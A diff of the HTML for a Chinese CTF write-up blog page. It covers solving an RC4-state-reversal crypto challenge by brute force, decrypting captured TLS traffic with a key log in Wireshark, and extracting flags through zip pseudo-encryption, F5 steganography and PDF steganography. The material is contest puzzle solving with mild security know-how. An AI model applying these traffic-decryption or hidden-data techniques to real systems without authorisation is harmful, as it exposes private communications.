+<h3 id="notRC4"><a href="#notRC4" class="headerlink" title="notRC4"></a>notRC4</h3><p>RC4的最后状态的S盒已知，倒推每一步的状态，但是有个索引j（查查RC4的资料吧）不知道，想了一下午，最终学长给hint说可以枚举，呃，又是爆破。。。</p>
 <p>exp如下：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python3</span>
 
@@ -1093,10 +1100,9 @@ key <span class="token operator">=</span> <span class="token punctuation">[</spa
 key <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># 得到的密钥流是反转的，要反转回来</span>
 
 <span class="token keyword">print</span><span class="token punctuation">(</span>xor<span class="token punctuation">(</span>enc_data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <hr>
-<h2 id="Misc">Misc</h2>
-<h3 id="Cosmos的午餐">Cosmos的午餐</h3>
-<p>wireshark分析，配置好TLS的密钥，参考一下<a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/nimasike/article/details/80887436">https://blog.csdn.net/nimasike/article/details/80887436</a>，配置好ssl_log.log，即可解密TLS会话数据。</p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Cosmos的午餐"><a href="#Cosmos的午餐" class="headerlink" title="Cosmos的午餐"></a>Cosmos的午餐</h3><p>wireshark分析，配置好TLS的密钥，参考一下<a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/nimasike/article/details/80887436">https://blog.csdn.net/nimasike/article/details/80887436</a>，配置好ssl_log.log，即可解密TLS会话数据。</p>
 <p>从一个包中找到上传文件的操作，并且找到上传后的路径</p>
 <p><img src="/images/1966f4b8/misc-1-1.png" alt="1"></p>
 <p>访问url，下载文件解压后，是图片一张，而且图片信息里有</p>
@@ -1105,14 +1111,12 @@ key <span class="token operator">=</span> key<span class="token punctuation">[</
 <p><img src="/images/1966f4b8/misc-1-4.png" alt="4"></p>
 <p>打开可下载一个压缩包，解压后是个二维码文件，扫码即可</p>
 <hr>
-<h3 id="所见即为假">所见即为假</h3>
-<p>压缩包是伪加密，解压后得到一张图片，查了好久查不出有隐写。几天后问了出题人，又是一次灵魂拷问：“压缩包注释你看了吗”，解压完后就把注意力放到图片上了，想不到压缩包还有猫腻。</p>
+<h3 id="所见即为假"><a href="#所见即为假" class="headerlink" title="所见即为假"></a>所见即为假</h3><p>压缩包是伪加密，解压后得到一张图片，查了好久查不出有隐写。几天后问了出题人，又是一次灵魂拷问：“压缩包注释你看了吗”，解压完后就把注意力放到图片上了，想不到压缩包还有猫腻。</p>
 <p><img src="/images/1966f4b8/misc-2-1.png" alt="1"></p>
 <p>那个F5之前查到过，是个隐写算法，那么这个图片应该是F5隐写的，而且后面有密码，用工具<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/matthewgao/F5-steganography">F5-steganography</a>可以解，解出来后是这样的：</p>
 <p><img src="/images/1966f4b8/misc-2-2.png" alt="2">hex编码过，解码发现有rar压缩包的头，把解码后的数据写入文件，解开压缩包，有flag.txt，里面即flag</p>
 <hr>
-<h3 id="地球上最后的夜晚">地球上最后的夜晚</h3>
-<p>pdf里面有隐写的信息，搜索pdf隐写的资料，可查到一些工具，解密后得到</p>
+<h3 id="地球上最后的夜晚"><a href="#地球上最后的夜晚" class="headerlink" title="地球上最后的夜晚"></a>地球上最后的夜晚</h3><p>pdf里面有隐写的信息，搜索pdf隐写的资料，可查到一些工具，解密后得到</p>
 <p><img src="/images/1966f4b8/misc-3-4.png" alt="4"></p>
 <p>解压压缩包得到一个doc文档，修改后缀名为.zip，解压找到一个secret.xml里有flag</p>
 <p><img src="/images/1966f4b8/misc-3-3.png" alt="3"></p>
@@ -1207,13 +1211,13 @@ key <span class="token operator">=</span> key<span class="token punctuation">[</
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">379k</span>
+    <span title="站点总字数">380k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">5:45</span>
+    <span title="站点阅读时长">5:46</span>
   </span>
 </div>
 <div class="busuanzi-count">
